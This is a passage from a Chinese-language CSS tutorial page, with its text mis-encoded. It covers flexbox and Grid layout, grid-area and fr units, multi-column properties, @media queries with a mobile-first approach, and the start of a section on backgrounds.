å®ç°ä¸¤æ å¸ƒå±€ï¼Œå³ä¾§å†…å®¹æº¢å‡ºæ—¶å‡ºç°æ»šåŠ¨æ¡ï¼Ÿ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.layout</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;<br>&#125;<br><span class="hljs-selector-class">.sidebar</span> &#123; <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">200px</span>; &#125;<br><span class="hljs-selector-class">.main</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-Grid-ç½‘æ ¼å¸ƒå±€ï¼ˆgrid-templateã€grid-areaã€fr-å•ä½ï¼‰"><a href="#2-3-Grid-ç½‘æ ¼å¸ƒå±€ï¼ˆgrid-templateã€grid-areaã€fr-å•ä½ï¼‰" class="headerlink" title="2.3 Grid ç½‘æ ¼å¸ƒå±€ï¼ˆgrid-templateã€grid-areaã€fr å•ä½ï¼‰"></a>2.3 Grid ç½‘æ ¼å¸ƒå±€ï¼ˆgrid-templateã€grid-areaã€fr å•ä½ï¼‰</h2><h3 id="æ ¸å¿ƒæ¦‚å¿µ"><a href="#æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="æ ¸å¿ƒæ¦‚å¿µ"></a>æ ¸å¿ƒæ¦‚å¿µ</h3><p>grid å¸ƒå±€å±äºäºŒç»´å¸ƒå±€æ¨¡å‹ï¼šåŒæ—¶æ§åˆ¶è¡Œå’Œåˆ—çš„æ’å¸ƒï¼Œä¸ flexbox ï¼ˆä¸€ç»´ï¼‰å½¢æˆäº’è¡¥</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid; <span class="hljs-comment">/* å¼€å¯ç½‘æ ¼å¸ƒå±€ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="grid-template-ç³»åˆ—å±æ€§è¯¦è§£"><a href="#grid-template-ç³»åˆ—å±æ€§è¯¦è§£" class="headerlink" title="grid-template ç³»åˆ—å±æ€§è¯¦è§£"></a>grid-template ç³»åˆ—å±æ€§è¯¦è§£</h3><p><strong>grid-template-columns&#x2F;rows</strong></p><ul><li>ä½œç”¨ï¼šå®šä¹‰æ˜¾ç¤ºç½‘æ ¼çš„åˆ—&#x2F;è¡Œå°ºå¯¸<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid; <span class="hljs-comment">/* å¼€å¯ç½‘æ ¼å¸ƒå±€ */</span><br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">200px</span> <span class="hljs-number">1</span>fr; <span class="hljs-comment">/* ä¸¤åˆ—ï¼šå›ºå®š+å¼¹æ€§ */</span><br>  <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">80px</span> auto <span class="hljs-number">60px</span>; <span class="hljs-comment">/* ä¸‰è¡Œ */</span><br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>; <span class="hljs-comment">/* ç½‘æ ¼é—´éš™ */</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>grid-template-areas</strong></p><ul><li>ä½œç”¨ï¼šå¯è§†åŒ–å¸ƒå±€å£°æ˜<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.dashboard</span> &#123;<br>  <span class="hljs-attribute">grid-template-areas</span>:<br>    <span class="hljs-string">&quot;header header header&quot;</span><br>    <span class="hljs-string">&quot;sidebar content .&quot;</span><br>    <span class="hljs-string">&quot;footer footer footer&quot;</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span> &#123; <span class="hljs-attribute">grid-area</span>: header; &#125;<br><span class="hljs-comment">/* å…¶ä»–åŒºåŸŸåŒç† */</span><br></code></pre></td></tr></table></figure></li><li>è§„åˆ™ï¼šç›¸åŒå‘½ååŒºåŸŸå¿…é¡»å½¢æˆçŸ©å½¢ï¼›ç‚¹å·ï¼ˆ.ï¼‰è¡¨ç¤ºç©ºç™½åŒºåŸŸ</li></ul><p><strong>å¤åˆå†™æ³• <code>grid-template</code></strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* è¡Œ / åˆ— / åŒºåŸŸ */</span><br><span class="hljs-attribute">grid-template</span>: <br>  <span class="hljs-string">&quot;head head&quot;</span> <span class="hljs-number">80px</span><br>  <span class="hljs-string">&quot;nav main&quot;</span> <span class="hljs-number">1</span>fr<br>  / <span class="hljs-number">200px</span> <span class="hljs-number">1</span>fr;<br></code></pre></td></tr></table></figure><h3 id="grid-area-è¯¦è§£"><a href="#grid-area-è¯¦è§£" class="headerlink" title="grid-area è¯¦è§£"></a>grid-area è¯¦è§£</h3><p><strong>åŸºç¡€å®šä¹‰</strong></p><p>grid-area æ˜¯ CSS Grid å¸ƒå±€ä¸­ç”¨äºç²¾ç¡®æ§åˆ¶ç½‘æ ¼é¡¹ä½ç½®çš„æ ¸å¿ƒå±æ€§ï¼Œæ˜¯ä»¥ä¸‹å±æ€§çš„å¤åˆå†™æ³•ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">grid-row-start</span> / <span class="hljs-attribute">grid-column-start</span> / <span class="hljs-attribute">grid-row-end</span> / <span class="hljs-attribute">grid-column-end</span><br></code></pre></td></tr></table></figure><p><strong>å››å¤§æ ¸å¿ƒåŠŸèƒ½</strong></p><p>ï¼ˆ1ï¼‰ä½œä¸º <code>grid-template-areas</code> çš„å‘½åå¼•ç”¨</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">grid-template-areas</span>:<br>    <span class="hljs-string">&quot;header header&quot;</span><br>    <span class="hljs-string">&quot;sidebar main&quot;</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span> &#123; <span class="hljs-attribute">grid-area</span>: header; &#125; <span class="hljs-comment">/* è‡ªåŠ¨å¡«å……å¯¹åº”åŒºåŸŸ */</span><br><span class="hljs-selector-class">.sidebar</span> &#123; <span class="hljs-attribute">grid-area</span>: sidebar; &#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ä½œä¸ºå®šä½ç®€å†™ï¼ˆè¡Œå¼€å§‹&#x2F;åˆ—å¼€å§‹&#x2F;è¡Œç»“æŸ&#x2F;åˆ—ç»“æŸï¼‰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/*3 è¡Œ 3 åˆ—å…± 9 æ ¼*/</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>fr); <span class="hljs-comment">/* 3 åˆ— */</span><br>  <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">100px</span>); <span class="hljs-comment">/* 3 è¡Œ */</span><br>&#125;<br><span class="hljs-comment">/*ç¬¬ 2 è¡Œç¬¬ 1 åˆ—å¼€å§‹ï¼Œç¬¬ 4 è¡Œç¬¬ 3 åˆ—ç»“æŸï¼Œå ç”¨ç¬¬2-3è¡Œï¼Œç¬¬1-2åˆ—*/</span><br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: <span class="hljs-number">2</span> / <span class="hljs-number">1</span> / <span class="hljs-number">4</span> / <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰é…åˆå‘½åçº¿ä½¿ç”¨</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">grid-template-columns</span>: [main-start] <span class="hljs-number">1</span>fr [content-start] <span class="hljs-number">1</span>fr [main-end];<br>&#125;<br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: <span class="hljs-number">1</span> / content-start / <span class="hljs-number">3</span> / main-end;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰è‡ªé€‚åº”å¸ƒå±€æ¡ˆä¾‹</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) &#123;<br>  <span class="hljs-selector-class">.app</span> &#123;<br>    <span class="hljs-attribute">grid-template-areas</span>:<br>      <span class="hljs-string">&quot;header&quot;</span><br>      <span class="hljs-string">&quot;content&quot;</span><br>      <span class="hljs-string">&quot;sidebar&quot;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fr-å•ä½-ç½‘æ ¼ä¸“å±ç©ºé—´åˆ†é…"><a href="#fr-å•ä½-ç½‘æ ¼ä¸“å±ç©ºé—´åˆ†é…" class="headerlink" title="fr å•ä½ - ç½‘æ ¼ä¸“å±ç©ºé—´åˆ†é…"></a>fr å•ä½ - ç½‘æ ¼ä¸“å±ç©ºé—´åˆ†é…</h3><p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p><ul><li>æŒ‰æ¯”ä¾‹åˆ†é…å®¹å™¨å‰©ä½™å¯ç”¨ç©ºé—´ï¼Œä¸ Flex çš„ flex-grow ç±»ä¼¼ä½†è®¡ç®—æ—¶æœºä¸åŒ</li><li>ä¸ <code>minmax()</code> ç»„åˆå®ç°å¼¹æ€§é™åˆ¶<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">300px</span> <span class="hljs-built_in">minmax</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>fr) <span class="hljs-number">1</span>fr;<br></code></pre></td></tr></table></figure></li></ul><p><strong>è®¡ç®—è§„åˆ™</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">2</span>fr <span class="hljs-number">100px</span>;<br></code></pre></td></tr></table></figure><ul><li>æ€»å®½åº¦ &#x3D; å®¹å™¨å®½åº¦ - å›ºå®šåˆ—å®½ï¼ˆ100pxï¼‰- åˆ—é—´è·ï¼ˆgapï¼‰</li><li>å‰©ä½™ç©ºé—´æŒ‰ 1:2 æ¯”ä¾‹åˆ†é…</li></ul><p><strong>ä¸ç™¾åˆ†æ¯”çš„åŒºåˆ«</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">fr</th><th align="left">%</th></tr></thead><tbody><tr><td align="left">è®¡ç®—åŸºå‡†</td><td align="left">å‰©ä½™ç©ºé—´</td><td align="left">çˆ¶å®¹å™¨æ€»ç©ºé—´</td></tr><tr><td align="left">æ˜¯å¦å—ç½‘æ ¼é—´éš™ï¼ˆgapï¼‰å½±å“</td><td align="left">åˆ†é…å‰æ‰£é™¤gap</td><td align="left">åŒ…å«gap</td></tr><tr><td align="left">ç»„åˆå¼¹æ€§</td><td align="left">å¯ä¸å›ºå®šå®½åº¦æ··åˆ</td><td align="left">éœ€é…åˆcalc</td></tr></tbody></table><h3 id="é«˜é¢‘é¢è¯•é—®é¢˜"><a href="#é«˜é¢‘é¢è¯•é—®é¢˜" class="headerlink" title="é«˜é¢‘é¢è¯•é—®é¢˜"></a>é«˜é¢‘é¢è¯•é—®é¢˜</h3><p>ï¼ˆ1ï¼‰grid-area å¦‚ä½•å®ç°è·¨è¡Œè·¨åˆ—</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* è·¨3è¡Œ2åˆ— */</span><br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: <span class="hljs-number">2</span> / <span class="hljs-number">1</span> / span <span class="hljs-number">3</span> / span <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åŒå grid-area çš„é¡¹ç›®ä¼šå‘ç”Ÿä»€ä¹ˆ</p><ul><li>æ ¹æ® DOM é¡ºåºå±‚å ï¼ˆåè€…è¦†ç›–å‰è€…ï¼‰ï¼Œå¯é€šè¿‡ z-index æ§åˆ¶å±‚çº§</li></ul><p>ï¼ˆ3ï¼‰å¦‚ä½•ä½¿ç”¨ grid-area å®ç°åœ£æ¯å¸ƒå±€</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">grid-template-areas</span>:<br>    <span class="hljs-string">&quot;header header&quot;</span><br>    <span class="hljs-string">&quot;sidebar main&quot;</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span> &#123; <span class="hljs-attribute">grid-area</span>: header; &#125;<br><span class="hljs-selector-class">.sidebar</span> &#123; <span class="hljs-attribute">grid-area</span>: sidebar; &#125;<br><span class="hljs-selector-class">.main</span> &#123; <span class="hljs-attribute">grid-area</span>: main; &#125;<br></code></pre></td></tr></table></figure><h3 id="å…¼å®¹æ€§"><a href="#å…¼å®¹æ€§" class="headerlink" title="å…¼å®¹æ€§"></a>å…¼å®¹æ€§</h3><ul><li>æ‰€æœ‰ç°ä»£æµè§ˆå™¨éƒ½æ”¯æŒ</li><li>å¯ä»¥ä½¿ç”¨ <code>@supports</code> æ£€æµ‹<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@supports</span> (<span class="hljs-attribute">display</span>: <span class="hljs-attribute">grid</span>) &#123;<br>  <span class="hljs-selector-class">.item</span> &#123; <span class="hljs-attribute">grid-area</span>: main; &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="2-4-å¤šåˆ—å¸ƒå±€ï¼ˆcolumn-countã€column-gapï¼‰"><a href="#2-4-å¤šåˆ—å¸ƒå±€ï¼ˆcolumn-countã€column-gapï¼‰" class="headerlink" title="2.4 å¤šåˆ—å¸ƒå±€ï¼ˆcolumn-countã€column-gapï¼‰"></a>2.4 å¤šåˆ—å¸ƒå±€ï¼ˆcolumn-countã€column-gapï¼‰</h2><p>å¤šåˆ—å¸ƒå±€ä¸“ä¸ºæ–‡æœ¬å†…å®¹çš„åˆ†æ å±•ç¤ºè®¾è®¡ï¼Œé€‚åˆæ–°é—»é˜…è¯»ã€æ–‡æ¡£æ’ç‰ˆç­‰åœºæ™¯</p><h3 id="æ ¸å¿ƒå±æ€§"><a href="#æ ¸å¿ƒå±æ€§" class="headerlink" title="æ ¸å¿ƒå±æ€§"></a>æ ¸å¿ƒå±æ€§</h3><p><strong>column-count - åˆ†æ æ•°é‡æ§åˆ¶</strong></p><ul><li>ä½œç”¨ï¼šæŒ‡å®šå†…å®¹åˆ†ä¸ºå¤šå°‘åˆ—</li><li>å–å€¼ï¼š<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">column-count</span>: <span class="hljs-number">3</span>; <span class="hljs-comment">/* å›ºå®š3æ  */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>autoï¼ˆé»˜è®¤ï¼‰ï¼šç”±å…¶ä»–å±æ€§ï¼ˆå¦‚column-widthï¼‰å†³å®šåˆ—æ•°</li><li>æ•´æ•°ï¼šå¼ºåˆ¶åˆ†æ æ•°é‡ï¼ˆå†…å®¹ä¸è¶³æ—¶ä¼šç•™ç©ºï¼‰</li></ul></li></ul><p><strong>column-gap - æ é—´é—´è·</strong></p><ul><li>ä½œç”¨ï¼šæ§åˆ¶åˆ—ä¸åˆ—ä¹‹é—´çš„é—´éš™</li><li>è¯­æ³•ï¼š<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">2em</span>;    <span class="hljs-comment">/* ç›¸å¯¹å•ä½ */</span><br>  <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">24px</span>;   <span class="hljs-comment">/* å›ºå®šåƒç´  */</span><br>  <span class="hljs-attribute">column-gap</span>: normal; <span class="hljs-comment">/* æµè§ˆå™¨é»˜è®¤å€¼ï¼ˆé€šå¸¸1emï¼‰ */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li>ä¸Grid&#x2F;Flexçš„gapåŒºåˆ«ï¼šå¤šåˆ—å¸ƒå±€çš„gapä»…æ”¯æŒå•å€¼ï¼ˆä¸æ”¯æŒè¡Œåˆ—åˆ†åˆ«è®¾ç½®ï¼‰</li></ul><h3 id="å®Œæ•´å±æ€§ä½“ç³»"><a href="#å®Œæ•´å±æ€§ä½“ç³»" class="headerlink" title="å®Œæ•´å±æ€§ä½“ç³»"></a>å®Œæ•´å±æ€§ä½“ç³»</h3><table><thead><tr><th align="left">å±æ€§</th><th align="left">ä½œç”¨</th><th align="left">ç¤ºä¾‹å€¼</th></tr></thead><tbody><tr><td align="left">column-width</td><td align="left">æ¯åˆ—ç†æƒ³å®½åº¦ï¼ˆå®é™…å¯èƒ½è°ƒæ•´ï¼‰</td><td align="left">200px &#x2F; auto</td></tr><tr><td align="left">column-count</td><td align="left">æœ€å¤§åˆ†æ æ•°</td><td align="left">3 &#x2F; auto</td></tr><tr><td align="left">column-gap</td><td align="left">æ é—´é—´è·</td><td align="left">1em &#x2F; 20px</td></tr><tr><td align="left">column-rule</td><td align="left">æ é—´åˆ†éš”çº¿ï¼ˆç±»ä¼¼borderï¼‰</td><td align="left">1px solid #ddd</td></tr><tr><td align="left">column-fill</td><td align="left">å†…å®¹å¡«å……æ–¹å¼</td><td align="left">auto &#x2F; balance</td></tr><tr><td align="left">column-span</td><td align="left">å…ƒç´ è·¨åˆ—ï¼ˆä»…all&#x2F;noneï¼‰</td><td align="left">allï¼ˆæ ‡é¢˜è·¨æ‰€æœ‰åˆ—ï¼‰</td></tr></tbody></table><h2 id="2-5-å“åº”å¼å¸ƒå±€ï¼ˆ-media-æŸ¥è¯¢ã€ç§»åŠ¨ä¼˜å…ˆç­–ç•¥ï¼‰"><a href="#2-5-å“åº”å¼å¸ƒå±€ï¼ˆ-media-æŸ¥è¯¢ã€ç§»åŠ¨ä¼˜å…ˆç­–ç•¥ï¼‰" class="headerlink" title="2.5 å“åº”å¼å¸ƒå±€ï¼ˆ@media æŸ¥è¯¢ã€ç§»åŠ¨ä¼˜å…ˆç­–ç•¥ï¼‰"></a>2.5 å“åº”å¼å¸ƒå±€ï¼ˆ@media æŸ¥è¯¢ã€ç§»åŠ¨ä¼˜å…ˆç­–ç•¥ï¼‰</h2><h3 id="å“åº”å¼æ ¸å¿ƒæœºåˆ¶ï¼š-media-æŸ¥è¯¢"><a href="#å“åº”å¼æ ¸å¿ƒæœºåˆ¶ï¼š-media-æŸ¥è¯¢" class="headerlink" title="å“åº”å¼æ ¸å¿ƒæœºåˆ¶ï¼š@media æŸ¥è¯¢"></a>å“åº”å¼æ ¸å¿ƒæœºåˆ¶ï¼š@media æŸ¥è¯¢</h3><p>ä½œç”¨ï¼šæ ¹æ®è®¾å¤‡ç‰¹æ€§ï¼ˆå®½åº¦ã€åˆ†è¾¨ç‡ã€æ–¹å‘ç­‰ï¼‰åº”ç”¨ä¸åŒçš„CSSè§„åˆ™</p><p><strong>åŸºç¡€è¯­æ³•ç»“æ„</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@media</span> [åª’ä½“ç±»å‹] [<span class="hljs-keyword">and</span>] (åª’ä½“ç‰¹å¾) &#123;<br>  <span class="hljs-comment">/* æ¡ä»¶æ»¡è¶³æ—¶åº”ç”¨çš„CSS */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å…³é”®åª’ä½“ç‰¹å¾</strong></p><table><thead><tr><th align="left">ç‰¹å¾</th><th align="left">åº”ç”¨åœºæ™¯</th><th align="left">ç¤ºä¾‹å€¼</th></tr></thead><tbody><tr><td align="left">min-width &#x2F; max-width</td><td align="left">è§†å£å®½åº¦æ–­ç‚¹</td><td align="left">(min-width: 768px)</td></tr><tr><td align="left">orientation</td><td align="left">è®¾å¤‡æ–¹å‘</td><td align="left">(orientation: portrait)</td></tr><tr><td align="left">resolution</td><td align="left">å±å¹•åˆ†è¾¨ç‡</td><td align="left">(min-resolution: 2dppx)</td></tr><tr><td align="left">hover</td><td align="left">è¾“å…¥è®¾å¤‡æ˜¯å¦æ”¯æŒæ‚¬åœ</td><td align="left">(hover: hover)</td></tr><tr><td align="left">prefers-color-scheme</td><td align="left">ç³»ç»Ÿæ·±è‰²æ¨¡å¼</td><td align="left">(prefers-color-scheme: dark)</td></tr></tbody></table><p><strong>å¤åˆæ¡ä»¶æŸ¥è¯¢</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* å¹³æ¿æ¨ªå±ä¸”æœ€å°å®½åº¦1024px */</span><br><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">1024px</span>) <span class="hljs-keyword">and</span> (<span class="hljs-attribute">orientation</span>: landscape) &#123;<br>  <span class="hljs-selector-class">.sidebar</span> &#123; <span class="hljs-attribute">display</span>: block; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç§»åŠ¨ä¼˜å…ˆï¼ˆmobile-firstï¼‰ç­–ç•¥"><a href="#ç§»åŠ¨ä¼˜å…ˆï¼ˆmobile-firstï¼‰ç­–ç•¥" class="headerlink" title="ç§»åŠ¨ä¼˜å…ˆï¼ˆmobile-firstï¼‰ç­–ç•¥"></a>ç§»åŠ¨ä¼˜å…ˆï¼ˆmobile-firstï¼‰ç­–ç•¥</h3><p><strong>æ ¸å¿ƒç†å¿µ</strong></p><p>å…ˆä¸ºç§»åŠ¨è®¾å¤‡ç¼–å†™åŸºç¡€æ ·å¼ï¼Œå†é€šè¿‡ <code>min-width</code> é€æ­¥å¢å¼ºå¤§å±ä½“éªŒ</p><p><strong>ä»£ç å®ç°èŒƒå¼</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* åŸºç¡€æ ·å¼ï¼ˆç§»åŠ¨ç«¯ï¼‰ */</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;<br>&#125;<br><br><span class="hljs-comment">/* å¹³æ¿é€‚é…ï¼ˆâ‰¥768pxï¼‰ */</span><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">768px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/* æ¡Œé¢ç«¯é€‚é…ï¼ˆâ‰¥1200pxï¼‰ */</span><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">1200px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">max-width</span>: <span class="hljs-number">1140px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬ä¸‰ç« ï¼šCSS-è§†è§‰ä¸åŠ¨ç”»"><a href="#ç¬¬ä¸‰ç« ï¼šCSS-è§†è§‰ä¸åŠ¨ç”»" class="headerlink" title="ç¬¬ä¸‰ç« ï¼šCSS è§†è§‰ä¸åŠ¨ç”»"></a>ç¬¬ä¸‰ç« ï¼šCSS è§†è§‰ä¸åŠ¨ç”»</h1><h2 id="3-1-èƒŒæ™¯ä¸è¾¹æ¡†ï¼ˆbackgroundã€border-radiusã€box-shadowï¼‰"><a href="#3-1-èƒŒæ™¯ä¸è¾¹æ¡†ï¼ˆbackgroundã€border-radiusã€box-shadowï¼‰" class="headerlink" title="3.1 èƒŒæ™¯ä¸è¾¹æ¡†ï¼ˆbackgroundã€border-radiusã€box-shadowï¼‰"></a>3.1 èƒŒæ™¯ä¸è¾¹æ¡†ï¼ˆbackgroundã€border-radiusã€box-shadowï¼‰</h2><h3 id="èƒŒæ™¯-background-å¤åˆå±æ€§"><a href="#èƒŒæ™¯-background-å¤åˆå±æ€§" class="headerlink" title="èƒŒæ™¯ - background å¤åˆå±æ€§"></a>èƒŒæ™¯ - background å¤åˆå±æ€§</h3><p>ç°ä»£ CSS èƒŒæ™¯å·²å‘å±•ä¸ºåŒ…å« 8 ä¸ªå­å±æ€§çš„å¼ºå¤§ç³»ç»Ÿ</p><p><strong>åˆ†å±‚èƒŒæ™¯ï¼ˆæ”¯æŒå¤šèƒŒæ™¯å›¾ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">.<span class="hljs-property">hero</span> &#123;<br>  <span class="hljs-attr">background</span>: <br>    linear-<span class="hljs-title function_">gradient</span>(<span class="hljs-title function_">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.3</span>), transparent),<br>    <span class="hljs-title function_">url</span>(<span class="hljs-string">&#x27;hero-bg.jpg&#x27;</span>) center/cover no-repeat,<br>    #f5f5f5; <span class="hljs-comment">/* å…œåº•é¢œè‰² */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å±‚å é¡ºåºï¼šå…ˆå£°æ˜çš„èƒŒæ™¯åœ¨ä¸Šå±‚</li></ul><p><strong>å…³é”®å­å±æ€§è¯¦è§£</strong></p><table><thead><tr><th align="left">å±æ€§</th><th 